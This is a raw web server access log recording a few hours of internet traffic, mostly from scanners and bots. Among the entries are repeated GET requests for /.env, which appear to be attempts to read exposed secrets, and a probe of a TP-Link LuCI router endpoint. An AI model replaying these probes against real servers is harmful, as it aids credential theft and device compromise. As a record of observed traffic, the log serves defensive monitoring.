80.82.77.202 - - [15/Jan/2025:10:26:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
80.82.77.202 - - [15/Jan/2025:10:36:05 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
13.87.132.36 - - [15/Jan/2025:11:33:05 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
112.173.214.203 - - [15/Jan/2025:11:55:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
213.136.86.135 - - [15/Jan/2025:12:24:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
213.136.86.135 - - [15/Jan/2025:12:28:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.156.33 - - [15/Jan/2025:12:35:10 +0000] "\x16\x03\x01" 400 524 "-" "-"
57.129.64.237 - - [15/Jan/2025:13:16:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
206.168.34.63 - - [15/Jan/2025:13:25:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.63 - - [15/Jan/2025:13:26:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:07 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:10 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:11 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [15/Jan/2025:13:37:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
66.240.223.202 - - [15/Jan/2025:13:43:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
139.162.71.210 - - [15/Jan/2025:13:50:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
171.7.112.57 - - [15/Jan/2025:13:50:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
179.43.191.146 - - [15/Jan/2025:14:18:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
